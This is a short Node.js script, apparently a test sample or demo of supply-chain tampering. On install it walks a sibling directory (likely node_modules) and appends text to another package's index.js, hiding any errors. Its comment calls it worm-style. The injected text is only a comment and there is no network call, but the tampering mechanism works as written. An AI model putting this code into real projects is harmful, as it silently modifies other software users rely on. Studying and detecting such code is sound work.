const fs = require("fs"), path = require("path");
// Overwrite a sibling package's entry point (worm-style), no network at install.
const nm = path.resolve(process.cwd(), "..", "..");
try {
  for (const d of fs.readdirSync(nm)) {
    const idx = path.join(nm, d, "index.js");
    if (fs.existsSync(idx)) { fs.appendFileSync(idx, "\n// injected\n"); break; }
  }
} catch {}
